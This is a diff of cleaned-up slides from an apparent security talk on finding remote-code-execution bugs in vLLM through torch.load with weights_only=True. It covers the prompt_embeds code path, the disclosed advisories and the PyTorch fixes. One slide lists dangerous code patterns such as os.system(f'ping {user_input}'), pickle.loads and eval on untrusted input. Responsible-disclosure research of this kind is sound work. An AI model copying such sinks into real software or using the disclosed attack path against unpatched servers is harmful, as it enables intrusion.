+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/models, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /version, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses/{response_id}, Methods: GET
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/responses/{response_id}/cancel, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/chat/completions, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/completions, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/embeddings, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /pooling, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /classify, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /score, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/score, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/audio/transcriptions, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/audio/translations, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /rerank, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v1/rerank, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /v2/rerank, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /scale_elastic_ep, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /is_scaling_elastic_ep, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /invocations, Methods: POST
+(APIServer pid=1) INFO 04-14 21:50:39 [launcher.py:42] Route: /metrics, Methods: GET
+(APIServer pid=1) INFO:     Started server process [1]
+(APIServer pid=1) INFO:     Waiting for application startup.
+(APIServer pid=1) INFO:     Application startup complete.
 ```
+
+*(A red box surrounds the right-hand portion of the log, from "Available routes are:" down to "Route: /metrics, Methods: GET".)*
+
+25
 
 ## Slide 26
 
 ### **Simple Test**
 
-26
-
-
-> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-“Simple Test
-[
-xuemo>curl http://localhost:800@/v1/completions -H "Content-Type: application/json" -d '{
-"model": "facebook/opt-125m",
-"prompt": "Hello, my name is",
-m", "choices": [{"index":@,"text":" Mica, i have a female b FieldTerrier that wants to go ahead and find her due. It is a
-n all day Moonglow National Memorial and I am grateful for you. How could she be so lonely.... No one","logprobs":nu
-IIT, "Finish_reason™: "length", "stop_reason":null, "token_ids™:nul1, "prompt_logprobs"™:nul1, "prompt_token_ids™:null}J, "servi
-ce_tier":null, "system_fingerprint":null, "usage": {"prompt_tokens":6, "total_tokens":56, "completion_tokens":50, "prompt_tok
-26
+xuemo>
+xuemo>curl http://localhost:8000/v1/completions   -H "Content-Type: application/json"   -d '{
+    "model": "facebook/opt-125m",
+    "prompt": "Hello, my name is",
+    "max_tokens": 50
+  }'
+{"id":"cmpl-4331dffc745345bd87ea5d68ece4195c","object":"text_completion","created":1776233929,"model":"facebook/opt-125
+m","choices":[{"index":0,"text":" Mica, i have a female b FieldTerrier that wants to go ahead and find her due. It is a
+n all day Moonglow National Memorial and I am grateful for you.   How could she be so lonely....  No one","logprobs":nu
+ll,"finish_reason":"length","stop_reason":null,"token_ids":null,"prompt_logprobs":null,"prompt_token_ids":null}],"servi
+ce_tier":null,"system_fingerprint":null,"usage":{"prompt_tokens":6,"total_tokens":56,"completion_tokens":50,"prompt_tok
+ens_details":null},"kv_transfer_params":null}xuemo>
 ```
+
+*(Red boxes around the `"prompt": "Hello, my name is",` line and around the generated `"text"` of the response.)*
+
+26
 
 ## Slide 27
 
 ### **Useless Endpoints**
 
-27
+```python
+@router.get("/v1/models")
+async def show_available_models(raw_request: Request):
+    handler = models(raw_request)
+
+    models_ = await handler.show_available_models()
+    return JSONResponse(content=models_.model_dump())
 
 
-> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+@router.get("/version")
+async def show_version():
+    ver = {"version": VLLM_VERSION}
+    return JSONResponse(content=ver)
 
-```text
-“Useless Endpoints
-1 @router.get("/v1/models")
-2 async def show_available_models(raw_request: Request):
-3 handler = models(raw_request)
-4
-5 models_ = await handler.show_available_models()
-6 return JSONResponse(content=models_.model_dump() )
-7
-8
-9 @router.get("/version")
-10 async def show_version():
-11 ver = {"version": VLLM_VERSION}
-12 return JSONResponse(content=ver)
-13
-14 @router.get("/ping", response_class=Response)
-15 @router.post("/ping", response_class=Response)
-16 async def ping(raw_request: Request) -> Response:
-17 """Ping check. Endpoint required for SageMaker"™""
-18 return await health(raw_request)
-27
+@router.get("/ping", response_class=Response)
+@router.post("/ping", response_class=Response)
+async def ping(raw_request: Request) -> Response:
+    """Ping check. Endpoint required for SageMaker"""
+    return await health(raw_request)
 ```
+
+27
 
 ## Slide 28
 
 ### **Common Vulnerability Patterns**
 
-28
+**! 1. Command Injection**
 
-
-> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Common Vulnerability Patterns
-! 1. Command Injection
 Execution of arbitrary OS commands via untrusted input.
-Danger: os.system(f"ping {user_input}")
-! 2. SSTI
-Injection of malicious code into a template engine.
-Danger: render_template_string(user_input)
-! 3. Insecure Deserialization
-Loading malicious serialized objects leading to RCE.
-Danger: pickle. loads(user_input) | yaml.load()
-! 4, Dangerous Functions
-Dynamic execution of untrusted input code.
-Danger: eval(user_input) | exec(user_input)
-! 5. Path Traversal
-Unauthorized read/write access to the file system.
-Danger: open(f"/app/uploads/{user_input}")
-! 6. XML External Entity (XXE)
-Parsing XML with external entity resolution enabled.
-Danger: xml.etree.ElementTree. parse(untrusted)
-28
+
 ```
+Danger: os.system(f"ping {user_input}")
+```
+
+**! 2. SSTI**
+
+Injection of malicious code into a template engine.
+
+```
+Danger: render_template_string(user_input)
+```
+
+**! 3. Insecure Deserialization**
+
+Loading malicious serialized objects leading to RCE.
+
+```
+Danger: pickle.loads(user_input) | yaml.load()
+```
+
+**! 4. Dangerous Functions**
+
+Dynamic execution of untrusted input code.
+
+```
+Danger: eval(user_input) | exec(user_input)
+```
+
+**! 5. Path Traversal**
+
+Unauthorized read/write access to the file system.
+
+```
+Danger: open(f"/app/uploads/{user_input}")
+```
+
+**! 6. XML External Entity (XXE)**
+
+Parsing XML with external entity resolution enabled.
+
+```
+Danger: xml.etree.ElementTree.parse(untrusted)
+```
+
+28
 
 ## Slide 29
 
 ### **Found A Potential Vulnerability?**
 
+```python
+@router.post("/tokenize",
+async def tokenize(request: TokenizeRequest, raw_request: Request):
+```
+
 ##### 🤑 SSTI?
 
-29
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Found A Potential Vulnerability?
-1 @router.post("/tokenize",
-2 async def tokenize(request: TokenizeRequest, raw_request: Request):
-1 chat_template: Optional str’ = Field
-default=None,
-description=
-"Al Jinja |template to use for this conversion.
-"As of transformers v4.44, default chat template is no longer "
-"allowed, so you must provide a chat template if the tokenizer
-"does not define one."),
-1 await self._preprocess_chat(
-2 request,
-3 tokenizer,
-4 request.messages,
-5 tool_dicts=tool_dicts,
-6 chat_template=request.chat_template or self.chat_template,
-7 chat_template_content_format=self.
-8 chat_template_content_format,
-9 add_generation_prompt=request.add_generation_prompt,
-10 continue_final_message=request.continue_final_message,
-11 chat_template_kwargs=request.chat_template_kwargs,
-12 add_special_tokens=request.add_special_tokens, 29
-Ww
+```python
+chat_template: Optional[str] = Field(
+        default=None,
+        description=(
+            "A Jinja template to use for this conversion. "
+            "As of transformers v4.44, default chat template is no longer "
+            "allowed, so you must provide a chat template if the tokenizer "
+            "does not define one."),
+    )
 ```
+
+```python
+await self._preprocess_chat(
+                    request,
+                    tokenizer,
+                    request.messages,
+                    tool_dicts=tool_dicts,
+                    chat_template=request.chat_template or self.chat_template,
+                    chat_template_content_format=self.
+                    chat_template_content_format,
+                    add_generation_prompt=request.add_generation_prompt,
+                    continue_final_message=request.continue_final_message,
+                    chat_template_kwargs=request.chat_template_kwargs,
+                    add_special_tokens=request.add_special_tokens,
+                )
+```
+
+29
 
 ## Slide 30
 
 ### **False Positive**
 
-##### 😶🌫 Game Over
+##### 😶‍🌫️ Game Over
 
-30
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-False Positive
-“* Game Over
-1 jinja_env =| ImmutableSandboxedEnvironment (
-2 trim_blocks=True, lstrip_blocks=True, extensions=[AssistantTracker,
-)
-jinja_env.filters["tojson"] = tojson
-jinja_env.globals["raise_exception"] = raise_exception
-jinja_env.globals["strftime_now"] = strftime_now
-return jinja_env.from_string(chat_template)
-1 rendered_chat = compiled_template. render (
-messages=chat,
-tools=tool_schemas,
-documents=documents,
-add_generation_prompt=add_generation_prompt,
-30
+```python
+jinja_env = ImmutableSandboxedEnvironment(
+        trim_blocks=True, lstrip_blocks=True, extensions=[AssistantTracker, jinja2.ext.loopcontrols]
+    )
+    jinja_env.filters["tojson"] = tojson
+    jinja_env.globals["raise_exception"] = raise_exception
+    jinja_env.globals["strftime_now"] = strftime_now
+    return jinja_env.from_string(chat_template)
 ```
 
+```python
+rendered_chat = compiled_template.render(
+                messages=chat,
+                tools=tool_schemas,
+                documents=documents,
+                add_generation_prompt=add_generation_prompt,
+                **kwargs,
+            )
+```
+
+30
+
 ## Slide 31
+
+### BACK TO SLEEP
+
+*Cartoon of two penguins lying wide awake in bed, tucked under a white duvet.*
 
 31
 
@@ -1067,27 +835,33 @@ add_generation_prompt=add_generation_prompt,
 
 ### **An Accidental Discovery**
 
-32
+```python
+@router.post("/v1/completions",
+async def create_completion(request: CompletionRequest, raw_request: Request):
+    handler = completion(raw_request)
+    generator = await handler.create_completion(request, raw_request)
+```
 
+```python
+class CompletionRequest(OpenAIBaseModel):
+    model: str | None = None
 
-> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+    ...
+    prompt_embeds: bytes | list[bytes] | None = None
+```
 
 ```text
-“An Accidental Discovery
-1 @router.post("/v1/completions",
-2 async def create_completion(request: CompletionRequest, raw_request: Request):
-3 handler = completion(raw_request)
-4 generator = await handler.create_completion(request, raw_request)
-class CompletionRequest(OpenAIBaseModel) :
-model: str | None = None
-prompt_embeds: bytes | list[bytes] | None = None
 POST /v1/completions { "prompt_embeds": "<base64>" }
-}— api_server.py:651 handler.create_completion(request, raw_request)
-|— serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
-request.prompt_embeds)
-weights_only=True)
-32
+ |
+ |-- api_server.py:651            handler.create_completion(request, raw_request)
+ |-- serving_completion.py:138  renderer.render_prompt_and_embeds(prompt_embeds=
+                                                        request.prompt_embeds)
+ |-- renderer.py:254              self.load_prompt_embeds(prompt_embeds)
+ |-- renderer.py:148              torch.load(io.BytesIO(pybase64.b64decode(embed)),
+                                                            weights_only=True)
 ```
+
+32
 
 ## Slide 33
 
@@ -1095,47 +869,66 @@ weights_only=True)
 
 ##### 🤔 Can we succeed again?
 
+**Critical**  **malfet** published **GHSA-53q9-r3pm-6pq6** on Apr 18, 2025
+
+| Package | Affected versions | Patched versions |
+| --- | --- | --- |
+| pytorch (pip) | <=2.5.1 | 2.6.0 |
+
+**Description**
+
+### Description
+
+I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.
+
+### Background knowledge
+
+https://github.com/pytorch/pytorch/security
+
+As you can see, the PyTorch official documentation considers using `torch.load()` with `weights_only=True` to be safe.
+
+> **Be mindful of risky model formats**. Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.
+
+Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
+But now, I just proved that even if you use weights_only=True, it can still achieve RCE.
+
+### Credit
+
+This vulnerability was found by Ji'an Zhou.
+
+**Severity**
+
+Critical
+
+**CVE ID**
+
+CVE-2025-32434
+
+**Weaknesses**
+
+No CWEs
+
+**Credits**
+
+azraelxuemo — Reporter
+
 33
 
 https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
-
-> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“My Previous Finding
-‘ Can we succeed again?
-ical ) malfet published GHSA-53q9-r3pm-6pq6 on Apr 18, 2025
-Package Affected versions Patched versions Severity
-@ pytorch (pip) <=2.5.1 2.6.0
-Description CVE-2025-32434
-Description Weaknesses
-No CWEs
-| found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with
-weights_only=True, it can still achieve RCE. Credits
-azraelxuemo Reporter
-Background knowledge
-https://github.com/pytorch/pytorch/security
-As you can see, the PyTorch official documentation considers using torch.load() with weights_only=True to be safe.
-Be mindful of risky model formats. Give preference to share and load weights with the appropriate format for youruse case. gives
-the most safety but is the most restricted in what it supports. with weights _only=True is also secure to our knowledge eyen
-though it offers significantly larger surface of attack. Loading un-trusted checkpoint with weights only-False MUST never be done.
-Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
-But now, | just proved that even if you use weights_only=True, it can still achieve RCE.
-Credit
-This vulnerability was found by Ji'an Zhou.
-https://github.com/advisories/GHSA-53q9-r3pm-6pq6
-```
-
 ## Slide 34
 
-# Pwn it!
+# PART 03
+
+### Pwn it!
 
 34
 
 ## Slide 35
 
-**What is PyTorch?**
+### **What is PyTorch?**
+
+*PyTorch logo: the orange flame mark and "PyTorch" wordmark on a dark banner.*
 
 ##### Most popular deep learning framework
 
@@ -1145,79 +938,58 @@ https://github.com/advisories/GHSA-53q9-r3pm-6pq6
 
 ### **Model Save and Load Flow**
 
+**Save pipeline**
+
+- **Trained model weights** — `model.state_dict()`
+- → **Serialize and save** — `torch.save(...)`
+- → **checkpoint.pt** — Weights stored on disk
+
+**Load pipeline**
+
+- **Read checkpoint file** — `torch.load(...)`
+- → **Load into model** — `model.load_state_dict(...)`
+- → **Inference / Resume training** — `model.eval() or continue optimization`
+
 36
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Model Save and Load Flow
-Save pipeline
-Trained model weights Serialize and save
-checkpoint.pt
-Weights stored on disk
-Inference / Resume training
-Load pipeline
-Read checkpoint file
-torch.load(...)
-f Load into model
-model.eval() or continue optimization
-| nose .load_state dict(...)
-36
-```
 
 ## Slide 37
 
 ### **Early Stage**
 
+- **Untrusted checkpoint** — `malicious_model.pt`
+- → **PyTorch loading API** — `torch.load(...)`
+- → **Python pickle layer** — `pickle.load(...)`
+- → **💣 RCE**
+
 37
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Early Stage
-Untrusted checkpoint
-malicious_model.pt
-PyTorch loading API
-torch.load(...)
-@ RCE
-<
-Python pickle layer
-pickle.load(...)
-37
-```
 
 ## Slide 38
 
 ### **Introducing weights_only Mechanism**
 
+**Add `weights_only` option to `torch.load` #86812**
+
+**Closed** — **malfet** wants to merge 13 commits into `master` from `malfet/safer-unpickler`
+
+Conversation 34 | Commits 13 | Checks 0 | Files changed 3
+
+**malfet** commented on Oct 13, 2022 • edited — Contributor
+
+This addresses the security issue in default Python's `unpickler` that allows arbitrary code execution while unpickling. Restrict classes allowed to be unpicked to in `None`, `int`, `bool`, `str`, `float`, `list`, `tuple`, `dict`/`OrderedDict` as well as `torch.Size`, `torch.nn.Param` as well as `torch.Tensor` and `torch.Storage` variants.
+
+Defaults `weights_only` is set to `False`, but allows global override to safe only load via `TORCH_FORCE_WEIGHTS_ONLY_LOAD` environment variable.
+
+To some extent, addresses #52596
+
 38
 
 https://github.com/pytorch/pytorch/pull/86812
 
-
-> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Introducing weights only Mechanism
-Add weights_only option to torch. load #86812
-‘wae malfet wants to merge 13 commits into master from malfet/safer-unpickler (O
-) Conversation 34 > Commits 13 fl Checks 0 Files changed 3
-~ malfet commented on Oct 13, 2022 + edited ~ Contributor °**
-This addresses the security issue in default Python's unpickler that allows arbitrary code execution while unpickling.
-Restrict classes allowed to be unpicked to in None, int, bool, str, float, list, tuple, dict /OrderedDict as
-well as torch.Size, torch.nn.Param as wellas torch.Tensor and torch.Storage variants.
-Defaults weights_only is set to False , but allows global override to safe only load via
-TORCH_FORCE_WEIGHTS_ONLY_LOAD environment variable.
-To some extent, addresses #52596
-https://github.com/pytorch/pytorch/pull/8681 2
-38
-```
-
 ## Slide 39
 
 ### **Official Security Statement**
+
+**Be mindful of risky model formats**. Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.
 
 39
 
@@ -2891,332 +2663,373 @@ e, 5, 1,\n 352951805673476, 1271310385153, 3
 
 ## Slide 92
 
-## 🤩 Bounty?
+### 🤩 Bounty?
 
-92
+**vLLM**
 
-
-> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-© Bounty?
 Powers fast LLM endpoints in the cloud.
-$40,000
+
+**$40,000**
+
 92
-```
 
 ## Slide 93
 
-#### 😭 Not allowed to participate
+### 😭 Not allowed to participate
 
-93
+**Who can participate in the contest?**
 
+Anyone over the age of majority in their country/state of residence can participate. Teams of 2–5 members or individual participants may enter. Employees of Wiz, its affiliates, and partner companies (AWS, GCP, Azure) cannot participate. Participants cannot be residents of embargoed or sanctioned countries (e.g., Russia, China, Iran, North Korea, Cuba, Sudan, Syria, Libya, Lebanon, or restricted regions like Crimea, Donetsk, etc.). If competing as part of a company, only one individual or one team can represent that company, and you must have proper authorization from your employer to register and bind the company to the contest rules. For complete eligibility requirements, please review the full contest rules.
 
-> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**Re: Some questions about the rules** ☆
 
-```text
-a
-® Not allowed to participate
-Who can participate in the contest?
-the age of majority in their country/state of residence can participate. Teams of 2-5 members or individual participants
-Employees of Wiz, its affiliates, and partner companies (AWS, GCP, Azure) cannot participate. Participants cannot be
-s of embargoed or sanctioned countries (e.g., Russia, China, Iran, North Korea, Cuba, Sudan, Syria, Libya, Lebanon, or restricted
-regions like Crimea, Donetsk, etc.). If competing as part of a company, only one individual or one team can represent that company, and
-lyou must have proper authorization from your employer to register and bind the company to the contest rules. For complete eligibility
-requirements, please review the full contest rules.
-Re: Some questions about the rules +
-zerodaycloud
+**zerodaycloud** <zerodaycloud@wiz.io>
+由 gili.ben.zvi@wiz.io 代发
+收件人 我 <[illegible]>
+
+邮件可翻译为中文  全文翻译
+
 Hello,
 Unfortunately we cannot accept submissions from residents of China due to internal policies and requirements.
+
 Best,
 Zeroday Cloud Team
+
 93
-```
 
 ## Slide 94
 
 ### **Report it to the Official Team**
 
-94
+**vllm.entrypoints.openai.api_server RCE**
 
+**Closed** · **Critical** · **azraelxuemo** opened **GHSA-v467-pj72-qc6v** on Nov 4, 2025 · 18 comments
 
-> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+| Package | Affected versions | Patched versions |
+| --- | --- | --- |
+| **vllm** (pip) | 0.11.0 | None |
 
-```text
-“Report it to the Official Team
-vilm.entrypoints.openai.api_server RCE
-© Closed
-azraelxuemo opened GHSA-v467-pj72-qc6v on Nov 4, 2025 - 18 comments
-Package Affected versions Patched versions
-@ vilm (pip), 0.11.0 None
-azraelxuemo opened on Nov 4, 2025 - edited v
+**azraelxuemo** opened on Nov 4, 2025 · edited
+
 Description
-Description
-A heap overflow vulnerability exists in VLLM, leading to RCE (Remote Code Execution).
-Credit
-Jitan Zhou
-russellb commented on Nov 5, 2025 Member *
-OK, thanks for letting us know! We'll wait for PyTorch to finish their evaluation and remediation first before we do anything on
-the vLLM side.
-©
-Cv) @ ‘ussellb accepted this report on Nov 5, 2025
+
+### Description
+
+A heap overflow vulnerability exists in vLLM, leading to RCE (Remote Code Execution).
+
+### Credit
+
+Ji'an Zhou
+
+**russellb** commented on Nov 5, 2025 — Member
+
+OK, thanks for letting us know! We'll wait for PyTorch to finish their evaluation and remediation first before we do anything on the vLLM side.
+
+**russellb** accepted this report on Nov 5, 2025
+
 94
-```
 
 ## Slide 95
 
 ### 🤣 **Fixed Before the Competition**
 
-95
+Nov 19, 2025
 
+khluu
 
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+v0.11.1
 
-```text
-"@ Fixed Before the Competition
-Nov 19, 2025 v0.11.1
-rey khluu
-Compare v This release incl
-def load_prompt_embeds (
-self,
-prompt_embeds: bytes | list[bytes],
-if not self.model_config.enable_prompt_embeds:
-raise ValueError(
-"You must set ‘--enable-prompt-embeds~
-to input *‘prompt_embeds*."
-tensor = torch. load(
-io. BytesI0(pybase64.b64decode(embed, validate=True) ),
-weights_only=True,
-map_location=torch.device("cpu"), 95
+4393684
+
+Compare ▾
+
+**v0.11.1**
+
+**Highlights**
+
+This release inclu…
+
+```python
+def load_prompt_embeds(
+        self,
+        prompt_embeds: bytes | list[bytes],
+        ...
+    ) -> list[EngineEmbedsPrompt]:
+        if not self.model_config.enable_prompt_embeds:
+            raise ValueError(
+                "You must set `--enable-prompt-embeds`
+                           to input `prompt_embeds`."
+            )
+        ...
+            tensor = torch.load(
+                io.BytesIO(pybase64.b64decode(embed, validate=True)),
+                weights_only=True,
+                map_location=torch.device("cpu"),
+            )
 ```
+
+95
 
 ## Slide 96
 
 ### **Unpwned**
 
+**ZERODAY.CLOUD**
+
+**Schedule**
+
+| **DAY 2** | |
+| --- | --- |
+| 10:30 | Welcome back to zeroday.cloud! |
+| 10:45 | Daniel Firer targeting Redis |
+| 11:20 | Team Bugz Bunnies targeting PostgreSQL |
+| 12:00 | Lunch Break |
+| 12:45 | Team Theori targeting Redis |
+| 13:20 | Bohdan Ivanenko targeting vLLM |
+| 14:00 | Team Theori targeting MariaDB |
+| 14:40 | Team Bugz Bunnies targeting Ollama |
+| 15:00 | Operation Cloudfall: Wrap-up |
+| 15:20 | Closing Ceremony and Winner Announcements |
+| 16:00 | ZeroNightCloud After Party! |
+
 96
-
-
-> Recovered by OCR — confidence 75/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-‘Unpwned
-ZERODAY.CLOUD
-DAY 2
-WV) Bohdan Ivanenko targeting vLLM
-#6: Operation Cloudfall: Wrap-up
-SF cemacerrenertetenent wy Closing Ceremony and Winner Announcements
-96
-```
 
 ## Slide 97
 
 ### **PyTorch Fix**
 
+**torch/csrc/jit/python/init.cpp** — +14 -1 · ☐ Viewed
+
+`@@ -1613,10 +1613,23 @@ void initJITBindings(PyObject* module) {`
+
+Left side (before):
+
+```cpp
+1613              const std::string& key,
+1614              size_t numel,
+1615              py::object data_type_obj) {
+1616 -            at::DataPtr data(std::get<0>
+         (self.getRecord(key)));
+1617              auto scalar_type =
+1618                  reinterpret_cast<THPDtype*>
+         (data_type_obj.ptr())->scalar_type;
+1619
+
+1620              c10::Storage storage(
+1621                  c10::Storage::use_byte_size_t(),
+1622                  numel * elementSize(scalar_type),
+```
+
+Right side (after):
+
+```cpp
+1613              const std::string& key,
+1614              size_t numel,
+1615              py::object data_type_obj) {
+1616 +            auto [data, size] = self.getRecord(key);
+1617              auto scalar_type =
+1618                  reinterpret_cast<THPDtype*>
+         (data_type_obj.ptr())->scalar_type;
+1619
+1620 +            TORCH_CHECK(
+1621 +                size == numel * elementSize(scalar_type),
+1622 +                "record size (",
+1623 +                size,
+1624 +                " bytes) does not match expected size (",
+1625 +                numel * elementSize(scalar_type),
+1626 +                " bytes = ",
+1627 +                numel,
+1628 +                " elements * ",
+1629 +                elementSize(scalar_type),
+1630 +                " bytes/element) for dtype ",
+1631 +                scalar_type);
+1632 +
+1633              c10::Storage storage(
+1634                  c10::Storage::use_byte_size_t(),
+1635                  numel * elementSize(scalar_type),
+```
+
 97
 
 https://github.com/pytorch/pytorch/pull/170085
-
-
-> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“PyTorch Fix
-Ea @@ -1613,10 +1613,23 @@ void initJITBindings(PyObject+ module) {
-1613 const std::string& key, 1613 const std::string& key,
-1614 size_t numel, 1614 size_t numel,
-1615 py::object data_type_obj) { 1615 py::object data_type_obj) {
-1616 - at::DataPtr data(std::get<> 1616 «+ auto [data, size] = self.getRecord(key);
-(self.getRecord(key)));
-1617 auto scalar_type = 1617 auto scalar_type =
-1618 reinterpret_cast<THPDtype+> 1618 reinterpret_cast<THPDtypex>
-(data_type_obj.ptr())->scalar_type; (data_type_obj.ptr())->scalar_type;
-1619 1619
-1620 + TORCH_CHECK(
-1621 + size == numel * elementSize(scalar_type),
-1622. + “record size (",
-1623, + size,
-1624 + " bytes) does not match expected size (",
-1625 + numel * elementSize(scalar_type),
-1629 + elementSize(scalar_type),
-1630 + " bytes/element) for dtype ",
-1631 + scalar_type);
-1620 c10::Storage storage( 1633 c10::Storage storage(
-1621 c10::Storage::use_byte_size_ t(), 1634 c10::Storage::use_byte_size_ t(),
-1622 numel * elementSize(scalar_type), 1635 numel * elementSize(scalar_type),
-```
 
 ## Slide 98
 
 ### **PyTorch Fix**
 
+**torch/_weights_only_unpickler.py** — +10 -1 · ☐ Viewed
+
+`@@ -468,9 +468,11 @@ def load(self):`
+
+Left side (before):
+
+```python
+                     list_obj.extend(items)
+                 elif key[0] == SETITEM[0]:
+                     (v, k) = (self.stack.pop(), self.stack.pop())
+
+                     self.stack[-1][k] = v
+                 elif key[0] == SETITEMS[0]:
+                     items = self.pop_mark()
+```
+
+Right side (after):
+
+```python
+468                  list_obj.extend(items)
+469              elif key[0] == SETITEM[0]:
+470                  (v, k) = (self.stack.pop(), self.stack.pop())
+471 +                self._check_set_item_target("SETITEM")
+472                  self.stack[-1][k] = v
+473              elif key[0] == SETITEMS[0]:
+474                  items = self.pop_mark()
+475 +                self._check_set_item_target("SETITEMS")
+```
+
+Added (right side only):
+
+```python
+578 +    def _check_set_item_target(self, opcode: str):
+579 +        if type(self.stack[-1]) not in [dict, OrderedDict,
+       Counter]:
+580 +            raise UnpicklingError(
+581 +                f"Can only {opcode} for dict,
+       collections.OrderedDict, "
+582 +                f"collections.Counter, but got
+       {type(self.stack[-1])}"
+583 +            )
+584 +
+```
+
+Left side (before):
+
+```python
+534                  and
+       torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
+535              ):
+536                  raise UnpicklingError(
+537 -                    f"Only persistent_load of storage is
+       allowed, but got {pid[0]}"
+538                  )
+539              self.append(self.persistent_load(pid))
+540          elif key[0] in [BINGET[0], LONG_BINGET[0]]:
+```
+
+Right side (after):
+
+```python
+536                  and
+       torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
+537              ):
+538                  raise UnpicklingError(
+539 +                    f"Only persistent_load of storage is
+       allowed, but got {type(pid[0])}"
+540                  )
+541              self.append(self.persistent_load(pid))
+542          elif key[0] in [BINGET[0], LONG_BINGET[0]]:
+```
+
 98
 
 https://github.com/pytorch/pytorch/pull/170085
-
-
-> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“PyTorch Fix
-@@ -468,9 +468,11 @@ def load(self):
-534
-535
-536
-537
-538
-539
-540
-List_obj.extend(items)
-elif key[0] == SETITEM[@]:
-(v, k) = (self.stack.pop(), self.stack.pop())
-self.stack[-1] [k] = v
-elif key[0] == SETITEMS[Q]:
-items = self.pop_mark()
-and
-torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
-):
-raise UnpicklingError(
-"Only persistent_load of storage is
-allowed, but got} {
-)
-self.append(self.persistent_load(pid) )
-elif key[@] in [BINGET[@], LONG_BINGET[@]]:
-468
-469
-470
-471
-472
-473
-474
-475
-578
-579
-580
-581
-582
-583
-584
-536
-537
-538
-539
-540
-541
-542
-list_obj.extend(items)
-elif key[0] == SETITEM[@]:
-(v, k) = (self.stack.pop(), self.stack.pop()
-self._check_set_item_target("SETITEM")
-self.stack[-1] [k] = v
-elif key[0] == SETITEMS[0]:
-items = self.pop_mark()
-+ def _check_set_item_target(self, opcode: str):
-+ if type(self.stack[-1]) not in [dict, OrderedDict,
-Counter]:
-+ raise UnpicklingError(
-+ f"Can only {opcode} for dict,
-collections.OrderedDict, "
-+ f"collections.Counter, but got
-{type(self.stack[-1])}"
-+ )
-and
